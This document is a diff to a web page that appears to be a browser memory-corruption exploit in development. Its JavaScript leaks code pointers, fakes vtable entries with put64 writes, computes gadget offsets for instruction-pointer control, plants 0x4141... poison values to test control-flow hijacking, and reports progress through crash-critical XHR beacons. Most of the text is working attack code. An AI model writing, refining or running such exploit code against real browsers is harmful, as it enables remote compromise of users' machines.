@@ -14,8 +14,9 @@
      - m_areThreadingChecksEnabled (byte +5 of impl pointer) stays 0
   4. Synchronous XHR (bs) for all crash-critical beacons
 
-  Base shape: gt=1 rv=6 cli=184 kc=1 bk=1 mt=1 pk=9 (all safe)
-  Poison test: pk=4 (fontPropertyChanged) -> crash = walk reached
+  Base shape: gt=1 rv=6 cli=184 kc=1 bk=1 mt=1 pk=-1 (all slots safe)
+  Poison tests: pk=4 (fontPropertyChanged) or pk=16 (all slots)
+  Byte-probe override: goff=N explicitly targets S0-N; never the default
 
   CRASH_CLASS: HIGH
 -->
@@ -38,7 +39,9 @@ function verd(k,t){var v=document.getElementById('verdict');v.style.background=(
 
 /* --- query params --- */
 function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
-var K=qint('k',1024), RT=qint('rt',0), PK=qint('pk',4), PW=qint('pw',80), DL=qint('dl',0);
+function rip2SlotFill(s0,safe,goff){return goff>=0?s0-BigInt(goff):safe;}
+function rip2SlotValue(jv,fill,pk){return(pk===16||(pk>=0&&pk<16&&jv===pk))?0x4141414141414141n:fill;}
+var K=qint('k',1024), RT=qint('rt',0), PK=qint('pk',-1), PW=qint('pw',80), DL=qint('dl',0);
 var GT=qint('gt',0), SI=qint('si',0), RV=qint('rv',6), KC=qint('kc',1), BK=qint('bk',1);
 var MT=qint('mt',1), MP=qint('mp',0), IVP=qint('ivp',0);
 var CLI=qint('cli',184);
@@ -502,15 +505,12 @@ function phase(){
           return;
         }
 
-        /* Compute gadgets + test offset from s0 */
-        var G_RET=S0>1n?S0-1n:0n;
-        var G_POP_RBP=S0>2n?S0-2n:0n;
-        /* Brute-test s0-N: try localStorage counter to iterate offsets */
-        var gOff=qint('goff',7);
-        var G_TRY=S0-BigInt(gOff);
-        bs('GADGET-ret='+hex(G_RET)+',try='+hex(G_TRY)+',off='+gOff);
-
+        /* Default to a known returning vtable slot. goff>=0 is an explicit
+           byte-probe override; it is never inferred from S0-1. */
         var SAFE=R6;
+        var gOff=qint('goff',-1);
+        var SLOT_FILL=rip2SlotFill(S0,SAFE,gOff);
+        bs('RIP2-SLOTS-safe='+hex(SAFE)+',fill='+hex(SLOT_FILL)+',off='+gOff+',pk='+PK);
 
         if(GT&&Q4===0n){
           bs('RETRY-GT');
@@ -551,11 +551,11 @@ function phase(){
             }
             if(VTAB>0n&&SKIPJ>=0){
               var sk=window.__sp[SKIPJ];
-              for(var jv=0;jv<16;jv++){put64(sk,8+jv*8,G_TRY);} // all slots → test gadget (s0-N)
+              for(var jv=0;jv<16;jv++){put64(sk,8+jv*8,rip2SlotValue(jv,SLOT_FILL,PK));} // safe fill; pk selects one poison slot, pk=16 poisons all
               for(var zz=0x80;zz<0xC0;zz++)sk[zz]=0;
               put32(sk,0x80,2);put64(sk,0x88,VTAB+0x08n);put32(sk,0x90,2);
             }
-            b('LAY-OK-cli='+(VTAB>0n?'SKIPJ+88':'self+'+CLI)+',fill='+hex(SAFE)+',bk='+BK+',kc='+KC);
+            b('LAY-OK-cli='+(VTAB>0n?'SKIPJ+88':'self+'+CLI)+',fill='+hex(SLOT_FILL)+',bk='+BK+',kc='+KC);
           }catch(eL){b('LAY-ERR-'+String(eL&&eL.message||eL).slice(0,60));}
 
           verd('ok','SELF='+hex(self)+'<br>VP='+hex(VP)+'<br>IM='+hex(IM));
